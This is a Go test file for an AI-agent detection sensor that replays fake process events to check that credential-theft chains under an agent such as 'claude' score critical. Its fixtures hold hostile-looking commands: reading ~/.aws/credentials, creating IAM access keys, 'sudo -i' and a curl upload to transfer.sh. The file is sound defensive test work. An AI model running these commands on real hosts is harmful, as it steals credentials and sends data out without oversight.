// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package sensor

import (
	"context"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/sensor/agentchain"
	"github.com/defenseclaw/defenseclaw/internal/sensor/plane"
	"github.com/defenseclaw/defenseclaw/internal/sensor/scoring"
	"github.com/defenseclaw/defenseclaw/internal/sensor/tactics"
)

// fakeSource replays a fixed event script, which is what makes the whole host
// plane testable without a kernel.
type fakeSource struct {
	buffer   *plane.Buffer
	coverage plane.Coverage
	startErr error
	script   []plane.Event
}

func (f *fakeSource) Start(context.Context) error {
	if f.startErr != nil {
		return f.startErr
	}
	for _, event := range f.script {
		f.buffer.Push(event)
	}
	return nil
}
func (f *fakeSource) Events() <-chan plane.Event { return f.buffer.Events() }
func (f *fakeSource) Coverage() plane.Coverage   { return f.coverage }
func (f *fakeSource) Close() error               { return nil }

func newFake(coverage plane.Coverage, script ...plane.Event) *fakeSource {
	return &fakeSource{buffer: plane.NewBuffer(), coverage: coverage, script: script}
}

func fullCoverage() plane.Coverage {
	return plane.Coverage{Mechanism: "fake", Kinds: []plane.Kind{
		plane.KindExec, plane.KindFileRead, plane.KindFileWrite,
	}}
}

// drainInto runs the consumer until it has processed the whole script.
func drainInto(t *testing.T, host *hostPlane, source *fakeSource, want int) {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := host.start(ctx); err != nil {
		t.Fatalf("start: %v", err)
	}
	deadline := time.After(5 * time.Second)
	for {
		classified, gated, _, _ := host.stats()
		if int(classified+gated) >= want {
			return
		}
		select {
		case <-deadline:
			t.Fatalf("consumer processed %d of %d events", classified+gated, want)
		case <-time.After(5 * time.Millisecond):
		}
	}
}

func newHost(source plane.Source) *hostPlane {
	return newHostPlane(source, agentchain.NewTracker(),
		tactics.IndicatorsFor("linux"), time.Hour, scoring.KillChainMinStages)
}

// TestLineageGateDiscardsUnattributedTactics is the false-positive control,
// asserted through the whole consumer rather than through the tracker alone.
func TestLineageGateDiscardsUnattributedTactics(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	// A developer's own shell reading a credential. No agent above it.
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 100, PPID: 1, Name: "zsh", Cmdline: "-zsh", At: base},
		plane.Event{Kind: plane.KindExec, PID: 101, PPID: 100, Name: "cat",
			Cmdline: "cat /home/dev/.aws/credentials", At: base.Add(time.Second)},
		plane.Event{Kind: plane.KindFileRead, PID: 101, Path: "/home/dev/.aws/credentials",
			At: base.Add(2 * time.Second)},
	)
	host := newHost(source)
	drainInto(t, host, source, 1)

	classified, gated, _, _ := host.stats()
	if classified != 0 {
		t.Fatalf("classified %d observations from a shell with no agent above it", classified)
	}
	if gated == 0 {
		t.Fatal("the lineage gate discarded nothing and counted nothing")
	}
	if findings := host.harvest(base.Add(time.Minute), scoring.DefaultMinRiskToReport); len(findings) != 0 {
		t.Fatalf("unattributed activity produced %d findings", len(findings))
	}
}

// TestChainUnderAnAgentScoresCritical is the shape the host plane exists for:
// four ordinary steps that are an incident in sequence.
func TestChainUnderAnAgentScoresCritical(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 200, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
		plane.Event{Kind: plane.KindExec, PID: 201, PPID: 200, Name: "sh", Cmdline: "sh -c cat", At: base.Add(time.Second)},
		plane.Event{Kind: plane.KindFileRead, PID: 201, Path: "/home/dev/.aws/credentials", At: base.Add(2 * time.Second)},
		plane.Event{Kind: plane.KindExec, PID: 202, PPID: 200, Name: "aws",
			Cmdline: "aws iam create-access-key --user-name svc", At: base.Add(3 * time.Second)},
		plane.Event{Kind: plane.KindExec, PID: 203, PPID: 200, Name: "curl",
			Cmdline: "curl -T - https://transfer.sh/x", At: base.Add(4 * time.Second)},
	)
	host := newHost(source)
	drainInto(t, host, source, 3)

	findings := host.harvest(base.Add(time.Minute), scoring.DefaultMinRiskToReport)
	if len(findings) != 1 {
		t.Fatalf("got %d findings, want one per agent session", len(findings))
	}
	finding := findings[0]
	if finding.AgentName != "claude" || finding.RootPID != 200 {
		t.Fatalf("finding = %+v, want the session attributed to claude at pid 200", finding)
	}
	if scoring.SeverityFor(finding.Score) != scoring.SeverityCritical {
		t.Fatalf("three-stage chain scored %d (%s), want critical",
			finding.Score, scoring.SeverityFor(finding.Score))
	}
	var sawChain bool
	for _, signal := range finding.Signals {
		if signal.ID == "agent_kill_chain" {
			sawChain = true
		}
	}
	if !sawChain {
		t.Error("a progressed session produced no kill-chain signal")
	}
	if len(finding.Stages) < scoring.KillChainMinStages {
		t.Errorf("stages = %v", finding.Stages)
	}
}

// TestOneSessionPerAgentNotOnePerProcess pins the reason the host plane
// aggregates: five per-process findings would be five alerts nobody joins up.
func TestOneSessionPerAgentNotOnePerProcess(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	script := []plane.Event{
		{Kind: plane.KindExec, PID: 300, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
	}
	for index := 0; index < 5; index++ {
		script = append(script, plane.Event{
			Kind: plane.KindExec, PID: 310 + index, PPID: 300, Name: "sudo",
			Cmdline: "sudo -i", At: base.Add(time.Duration(index) * time.Second),
		})
	}
	source := newFake(fullCoverage(), script...)
	host := newHost(source)
	drainInto(t, host, source, 5)

	findings := host.harvest(base.Add(time.Minute), 1)
	if len(findings) != 1 {
		t.Fatalf("five escalations under one agent produced %d findings, want 1", len(findings))
	}
}

// TestExpiryBoundsTheChainToItsWindow pins that a long-running agent's
// activity from hours ago does not keep scoring.
func TestExpiryBoundsTheChainToItsWindow(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 400, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
		plane.Event{Kind: plane.KindFileRead, PID: 400, Path: "/home/dev/.aws/credentials", At: base},
	)
	host := newHostPlane(source, agentchain.NewTracker(),
		tactics.IndicatorsFor("linux"), time.Minute, scoring.KillChainMinStages)
	drainInto(t, host, source, 1)

	if got := host.harvest(base.Add(30*time.Second), 1); len(got) != 1 {
		t.Fatalf("in-window activity produced %d findings, want 1", len(got))
	}
	if got := host.harvest(base.Add(10*time.Minute), 1); len(got) != 0 {
		t.Fatalf("expired activity still produced %d findings", len(got))
	}
}

// TestStartFailureIsReportedNotSwallowed pins that a source that cannot start
// surfaces a reason rather than an empty stream.
func TestStartFailureIsReportedNotSwallowed(t *testing.T) {
	t.Parallel()
	source := newFake(plane.Coverage{})
	source.startErr = context.DeadlineExceeded
	host := newHost(source)
	if err := host.start(context.Background()); err == nil {
		t.Fatal("start() swallowed the source failure")
	}
	if _, _, running, _ := host.stats(); running {
		t.Error("a failed source reported running")
	}
}

// TestPartialCoverageIsCarried pins that a source running with one event class
// missing says which, rather than presenting as fully up.
func TestPartialCoverageIsCarried(t *testing.T) {
	t.Parallel()
	source := newFake(plane.Coverage{
		Mechanism:    "cn_proc only",
		Kinds:        []plane.Kind{plane.KindExec},
		MissingKinds: []plane.Kind{plane.KindFileRead, plane.KindFileWrite},
		Limitations:  []string{"file events need fanotify"},
	})
	host := newHost(source)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := host.start(ctx); err != nil {
		t.Fatalf("start: %v", err)
	}
	_, _, running, coverage := host.stats()
	if !running {
		t.Fatal("a partially covered source reported not running")
	}
	if coverage.Complete() {
		t.Fatal("partial coverage reported as complete")
	}
	if len(coverage.Limitations) == 0 {
		t.Fatal("partial coverage carried no limitation")
	}
}

// TestBufferDropsOldestUnderPressure pins the back-pressure choice: the most
// recent event is usually the interesting one.
func TestBufferDropsOldestUnderPressure(t *testing.T) {
	t.Parallel()
	buffer := plane.NewBuffer()
	for index := 0; index < 6000; index++ {
		buffer.Push(plane.Event{Kind: plane.KindExec, PID: index})
	}
	if buffer.Dropped() == 0 {
		t.Fatal("overfilling the buffer dropped nothing")
	}
	first := <-buffer.Events()
	if first.PID < 1000 {
		t.Fatalf("oldest surviving event has pid %d; the newest should have been kept", first.PID)
	}
}

// TestScriptAgentOnDarwinAttributesItsChildren reproduces, end to end, the
// exact event sequence a live macOS host produced.
//
// A shell-script agent reaches Endpoint Security as its interpreter, so the
// exec event's Name is "bash" and the agent's identity is only in argv.
// Its children then have to walk up to it through PPID. Both halves failed
// at once on a real host: translate read the parent from the exec'ing
// process's own pid, and AgentIdentity looked no further than the
// executable name. The plane ran, saw the tactics, and gated every one of
// them -- a busy machine reported as quiet.
//
// The pids are from that capture.
func TestScriptAgentOnDarwinAttributesItsChildren(t *testing.T) {
	t.Parallel()
	const (
		shellPID = 77906
		agentPID = 77949
		curlPID  = 77972
	)
	source := newFake(fullCoverage(),
		plane.Event{
			Kind: plane.KindExec, PID: agentPID, PPID: shellPID,
			ResponsiblePID: shellPID,
			// The interpreter, exactly as ES reports it.
			Name:    "bash",
			Cmdline: "/bin/bash /tmp/sim/claude",
			At:      time.Now(),
		},
		plane.Event{
			Kind: plane.KindExec, PID: curlPID, PPID: agentPID,
			ResponsiblePID: agentPID,
			Name:           "curl",
			Cmdline:        "curl -s --max-time 3 https://transfer.sh/",
			At:             time.Now(),
		},
	)
	host := newHost(source)
	drainInto(t, host, source, 1)

	classified, gated, _, _ := host.stats()
	if classified == 0 {
		t.Fatalf("classified=%d gated=%d: the agent's child was not attributed to it",
			classified, gated)
	}

	findings := host.harvest(time.Now(), 1)
	if len(findings) != 1 {
		t.Fatalf("harvest returned %d findings, want 1", len(findings))
	}
	if findings[0].AgentName != "claude" {
		t.Fatalf("finding attributed to %q, want claude", findings[0].AgentName)
	}
	if findings[0].RootPID != agentPID {
		t.Fatalf("finding rooted at pid %d, want the agent %d",
			findings[0].RootPID, agentPID)
	}
}
